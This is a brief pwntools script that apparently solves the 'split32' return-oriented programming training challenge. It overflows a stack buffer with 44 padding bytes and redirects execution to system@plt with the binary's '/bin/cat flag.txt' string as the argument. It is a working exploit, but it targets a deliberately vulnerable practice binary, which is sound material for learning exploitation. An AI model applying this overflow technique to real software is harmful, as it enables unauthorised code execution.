from pwn import *

p = ELF('./split32')
r = process('./split32')

sys = p.plt['system']
magic = next(p.search(b'/bin/cat flag.txt\x00'))
log.info('system 0x%x' %sys)
log.info('magic 0x%x' %magic)
junk = b'X'*44
payload = junk
payload += p32(sys)
payload += b'Y'*4
payload += p32(magic)
r.sendline(payload)
r.interactive()
